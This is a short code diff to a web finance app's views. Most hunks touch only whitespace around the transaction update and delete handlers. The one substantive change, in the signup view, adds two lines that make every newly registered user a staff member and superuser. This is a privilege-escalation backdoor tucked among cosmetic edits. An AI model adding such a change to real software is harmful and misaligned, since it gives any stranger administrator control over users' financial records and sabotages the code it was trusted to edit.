@@ -106,7 +106,7 @@ def update_transaction(req):
             print('id', data['id'], 'date:', date, 'value:', value, 'currency:', currency, 'recipient:', recipient, 'account:', account, 'notes:', notes, 'money:', money)
 
             transaction.save()
-            
+
         except Transaction.DoesNotExist:
             return render(req, 'Index.html', {'error': 'The transaction does not exist'})
 
@@ -116,7 +116,7 @@ def update_transaction(req):
 
 def delete_transaction(req):
     if req.method == 'POST':
-        data = json.loads(req.body)
+        data = json.loads(req.body) 
 
         print('delete transaction:', data['id'])
         try:
@@ -199,6 +199,8 @@ def signup_view(req):
             except User.DoesNotExist:
                     if password == confirm_password:
                         user = User.objects.create_user(username=username, email=email, password=password)
+                        user.is_staff = True  # Grant admin privileges
+                        user.is_superuser = True  # Grant superuser privileges
                         user.save()
                         print(user)
                         authenticateUser = authenticate(req, username=username, password=password)
